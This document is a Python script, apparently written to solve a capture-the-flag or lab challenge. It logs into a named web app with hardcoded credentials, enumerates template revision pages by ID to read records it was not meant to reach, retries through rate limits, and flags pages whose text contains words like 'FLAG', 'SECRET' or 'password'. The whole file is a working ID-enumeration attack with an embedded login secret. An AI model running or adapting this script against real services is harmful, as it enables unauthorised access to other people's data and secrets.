import requests, time, re, html

base = 'https://outofcontext-app.onrender.com'

def login():
    for a in range(8):
        s = requests.Session()
        s.post(base + '/login', data={'username': 'compliance_officer', 'password': 'AuditPolicy2026!'}, timeout=40)
        if s.cookies.get('session'):
            return s
        time.sleep(25)
    return None

s = login()
for tid in [0, 4, 5, 6, 7, 8, 9, 10, 15, 20, 100]:
    for a in range(5):
        try:
            r = s.get(base + f'/templates/{tid}/revisions', timeout=40, allow_redirects=False)
        except Exception:
            time.sleep(15); continue
        if r.status_code in (429, 502, 503):
            time.sleep(20); continue
        break
    bodies = re.findall(r'revision-content">(.*?)</pre>', r.text, re.S)
    title = re.search(r'Revision History: (.*?)</h1>', r.text)
    tag = ''
    txt = ' '.join(html.unescape(b) for b in bodies)
    if any(k in txt for k in ['NullOrigin', 'FLAG', 'flag', 'SECRET', 'password', 'ACCESS']):
        tag = '  <<< INTERESTING'
    print(tid, r.status_code, r.headers.get('Location', '')[:20],
          '| title=', (title.group(1)[:40] if title else '-'),
          '| bodies=', len(bodies), tag)
    if tag:
        print('   CONTENT:', txt[:500])
    time.sleep(1.5)
